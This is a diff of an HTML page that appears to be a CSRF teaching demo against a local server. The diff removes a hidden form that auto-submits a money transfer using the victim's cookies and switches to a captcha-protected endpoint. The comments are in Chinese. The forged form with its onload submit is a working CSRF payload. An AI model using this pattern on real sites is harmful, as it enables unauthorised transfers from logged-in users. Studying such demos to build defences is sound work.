@@ -9,13 +9,6 @@
 </head>
 
 <body>
-    <!-- 偷偷转走你的钱： 3001端口的cookie被自动带去了3001的服务器 -->
-    <!-- 表单没有跨域问题 -->
-    <form name="sneak" action="http://localhost:3001/api/transfer" method="post">
-        <input type="text" name="payee" value="yvette" />
-        <input type="text" name="amount" value="2000" />
-    </form>
-
     <!-- 有验证码的接口 -->
     <!-- 虽然用户已经登录，但是需要验证码，验证码匹配错误，不能转走钱 -->
     <form name="sneak1" action="http://localhost:3001/api/transfer1" method="post">
@@ -25,11 +18,7 @@
 </body>
 <script>
     window.onload = function () {
-        /**
-         * 以下语句，每次放开对应的一个即可
-         */
-        document.sneak.submit(); //没有防御CSRF攻击
-        // document.sneak1.submit();   //有验证码的情况
+        document.sneak1.submit();   //有验证码的情况
     }
 </script>
 
